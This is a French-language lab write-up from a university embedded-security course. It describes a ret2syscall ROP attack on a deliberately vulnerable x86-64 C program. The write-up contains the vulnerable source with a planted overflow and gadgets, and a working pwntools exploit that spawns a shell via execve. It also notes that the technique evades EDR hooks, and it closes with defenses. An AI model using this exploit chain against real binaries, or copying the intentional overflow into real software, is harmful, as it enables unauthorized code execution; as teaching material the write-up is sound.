# Write-up — Lab 10 : ret2syscall — execve direct via kernel

> **Embedded Security — C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![ret2syscall](https://img.shields.io/badge/technique-ret2syscall-red.svg)]()
[![execve](https://img.shields.io/badge/syscall-execve%2059-orange.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-ROP%28%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** NX activé, pas de canary, pas de PIE  
**Technique :** ret2syscall — appeler `execve("/bin/sh")` directement via l'instruction `syscall` sans passer par libc  
**Avantage :** Aucune dépendance libc — technique utilisée dans les implants modernes pour éviter les hooks userland  
**Résultat :** Shell interactif via syscall kernel direct

---

## 2. Environnement

```text
OS     : WSL2 Ubuntu — Linux 6.6
gcc    : -g -fno-stack-protector -no-pie
```

**checksec :**

```
Stack:  No canary found
NX:     NX enabled
PIE:    No PIE (0x400000)
```

---

## 3. ret2syscall vs ret2libc

| | ret2libc | ret2syscall |
|---|---|---|
| Appel | `system("/bin/sh")` via libc | `execve("/bin/sh")` via kernel |
| Dépendance | libc (adresse variable avec ASLR) | Aucune — kernel toujours disponible |
| Registres | RDI = "/bin/sh" | RAX=59, RDI=path, RSI=argv, RDX=envp |
| Détection | Hooks libc (EDR/AV) | Plus difficile à détecter |

---

## 4. Convention syscall x86-64

```
RAX = numéro du syscall  (59 = SYS_execve)
RDI = arg1               (chemin : "/bin/sh")
RSI = arg2               (argv   : ["/bin/sh", "-i", NULL])
RDX = arg3               (envp   : NULL)
syscall                  → appel kernel
```

---

## 5. Code vulnérable — `target.c`

```c
#include <unistd.h>

// Gadgets dans .section .text — IMPORTANT : avant les globals
// sinon GCC les place en .data (NX → SIGSEGV)
__asm__(".section .text\n"
        ".global pop_rax\npop_rax:\n\tpop %rax\n\tret\n"
        ".global pop_rdi\npop_rdi:\n\tpop %rdi\n\tret\n"
        ".global pop_rsi\npop_rsi:\n\tpop %rsi\n\tret\n"
        ".global pop_rdx\npop_rdx:\n\tpop %rdx\n\tret\n"
        ".global do_syscall\ndo_syscall:\n\tsyscall\n\tret\n");

const char binsh[] = "/bin/sh";
const char arg_i[] = "-i";
const char* sh_argv[] = {binsh, arg_i, NULL};

void vulnerable() {
    char buffer[64];
    write(1, "Input : ", 8);
    read(0, buffer, 200);      // overflow volontaire
}

int main() { vulnerable(); return 0; }
```

**Piège rencontré :** Si les gadgets `__asm__` sont déclarés APRÈS les globals C, GCC les place dans `.data` (non-exécutable avec NX). La directive `.section .text` force leur placement dans la section code.

---

## 6. Exploit — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.binary = elf

p = process('./target')

binsh_addr = elf.sym['binsh']
argv_addr  = elf.sym['sh_argv']

rop = ROP(elf)
rop.raw(elf.sym['pop_rax'])   ; rop.raw(59)          # SYS_execve
rop.raw(elf.sym['pop_rdi'])   ; rop.raw(binsh_addr)  # path
rop.raw(elf.sym['pop_rsi'])   ; rop.raw(argv_addr)   # argv = ["/bin/sh", "-i", NULL]
rop.raw(elf.sym['pop_rdx'])   ; rop.raw(0)           # envp = NULL
rop.raw(elf.sym['do_syscall'])

OFFSET = 72
payload = b'A' * OFFSET + rop.chain()

p.recvuntil(b'Input : ')
p.send(payload)
p.interactive()
```

---

## 7. Chaîne ROP

```
0x0000:  0x401xxx  pop_rax    → RAX = 59 (SYS_execve)
0x0008:      0x3b
0x0010:  0x401xxx  pop_rdi    → RDI = &"/bin/sh"
0x0018:  0x402008  binsh
0x0020:  0x401xxx  pop_rsi    → RSI = &sh_argv
0x0028:  0x404020  sh_argv
0x0030:  0x401xxx  pop_rdx    → RDX = 0 (envp NULL)
0x0038:       0x0
0x0040:  0x401xxx  do_syscall → syscall kernel
```

---

## 8. Progression des techniques ROP

| Lab | Technique | Cible |
| --- | --- | --- |
| 05 | ret2libc | system() via libc |
| 06 | ret2plt + ret2libc | leak libc + system() |
| 07 | PIE + ret2libc | leak PIE + libc + system() |
| 08 | Canary + ret2win | leak canary + win() |
| 09 | Full combo | PIE + Canary + ASLR + system() |
| **10** | **ret2syscall** | **execve() direct kernel** |

---

## 9. Défense

| Vecteur | Mesure |
| --- | --- |
| Overflow | `read(0, buf, sizeof(buf))` |
| Gadgets dans le binaire | Compiler sans gadgets explicites — utiliser `-fcf-protection` |
| syscall direct | **seccomp** — filtrer les syscalls autorisés par processus |
| ROP en général | **Shadow Stack (SHSTK)** valide les adresses de retour |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Syscall utilisé | `execve` — numéro 59 |
| Registres | RAX=59, RDI=binsh, RSI=argv, RDX=0 |
| Piège clé | Gadgets `__asm__` après globals → placés en .data (NX) → fix : `.section .text` |
| Avantage | Aucun hook libc — appel kernel direct |

> Screenshot : [docs/lab10_ret2syscall.png](docs/lab10_ret2syscall.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
